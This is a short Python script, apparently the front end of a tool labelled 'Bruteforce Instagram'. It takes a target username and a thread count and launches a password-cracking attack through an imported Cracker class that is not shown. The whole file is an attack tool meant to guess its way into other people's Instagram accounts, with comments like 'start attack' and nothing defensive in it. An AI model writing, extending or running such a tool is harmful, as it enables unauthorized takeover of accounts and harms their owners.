# Date: 05/05/2018
# Author: Pure-L0G1C
# Description: Bruteforce Instagram

from time import sleep 
from os.path import exists
from sys import exit, version 
# from lib.bruter import Bruter 
# from lib.session import Session 
from argparse import ArgumentParser
from instagram.cracker import Cracker

# def _input(msg):
#   return raw_input(msg).lower() if int(version.split()[0].split('.')[0]) == 2 else input(msg).lower()

def main():
  # assign arugments
  args = ArgumentParser()
  args.add_argument('username', help='email or username')
  args.add_argument('threads', help='password per seconds. Any number <= 16')
  # args.add_argument('wordlist', help='password list')
  args = args.parse_args()
  
  # start attack
  cracker = Cracker(int(args.threads))
  cracker.set_username(args.username.title())
  result = cracker.start()
  print(result)


if __name__ == '__main__':
  main()